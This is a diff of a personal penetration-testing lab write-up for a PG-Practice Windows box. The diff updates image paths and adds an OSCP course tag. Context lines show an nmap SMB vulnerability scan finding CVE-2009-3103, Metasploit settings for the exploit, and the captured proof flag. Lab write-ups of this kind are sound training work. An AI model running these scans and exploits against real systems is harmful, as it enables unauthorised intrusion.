@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-23
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Windows
 Difficulty: Easy
@@ -111,7 +112,7 @@ No enumeration conducted
 No enumeration conducted
 ## Port 139 & 445 - SMB (Windows Netbios-SSN)
 - Ran `sudo nmap --script smb-vuln* -p 139,445 192.168.240.45` to identify vulnerabilities in SMB, identified `SMBv2 exploit` (CVE-2009-3103)
-![[Pasted image 20241023201127.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241023201127.png]]
 ## Port 3389 - SSL (MS WBT Server)
 No enumeration conducted
 ## Port 5357 - HTTP (Microsoft HTTPAPI/2.0)
@@ -129,7 +130,7 @@ set RHOSTS 192.168.242.40
 set LHOST 192.168.45.199
 run
 ```
-![[Pasted image 20241024175717.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241024175717.png]]
 - Navigated `C:\Users\Administrator\Desktop\` and ran `cat proof.txt` to print `7ff8cdacb8d95f599362f06e5ce14394`
 
 ---
